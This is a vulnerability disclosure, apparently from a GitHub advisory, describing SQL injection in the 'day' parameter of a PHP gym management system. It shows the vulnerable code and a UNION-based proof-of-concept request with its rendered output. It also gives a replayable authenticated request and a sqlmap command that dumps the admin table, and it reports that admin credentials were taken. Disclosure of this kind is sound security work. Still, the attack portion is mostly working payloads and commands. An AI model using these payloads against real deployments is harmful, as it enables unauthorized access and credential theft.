# Gym Management System In PHP has an SQL injection vulnerability in functions/functions.php:31-57

## supplier 
https://code-projects.org/gym-management-system-in-php-with-source-code/
## Vulnerability file
functions/functions.php:31-57

## describe
In functions.php, 

**Code analysis**    

```
if(isset($_GET['day'])){
    $day_id=$_GET['day'];
    $get_exer="SELECT * FROM exercises WHERE day_id='$day_id'";
    $run_exer=mysqli_query($db, $get_exer);
    ...
}
```
`$_GET['day']` is directly concatenated into the query condition without any integer conversion or parameterization. At the same time, the query results are directly rendered on the page, so this point is not only injectable but also has obvious echo capability.


## POC

```
GET /mygym/index.php?day=-1'%20UNION%20SELECT%20999,'SQLI_MARK','9',1,'Bench%20Press.jpg',1%20--%20- HTTP/1.1
Host: 127.0.0.1
```

Send this request, The attacker's crafted content successfully appeared in the response:

```
<h3 style='color:#f2e013;'>SQLI_MARK</h3>
...
<h3 style='color:#e0d126;'>9 Sets</h3>
```

This indicates that the injected data has participated in page rendering, constituting a UNION-based reflected SQL injection that can be reliably exploited.

## Exploit

After successfully logging in, test the parameter 'day' with cookies

```
GET /mygym/index.php?day=1 HTTP/1.1
Host: 192.168.10.101
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.101/mygym/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=l4um1e5q16imve2acta7tntl6l
Connection: close


```

```
sqlmap -r 1.txt --level 5 -o --batch -D mygym -T admin --dump
```

Successfully injected the admin's account and password.

<img width="1610" height="948" alt="image" src="https://github.com/user-attachments/assets/7216ac94-6da3-41fc-bd7a-a5271b489db6" />
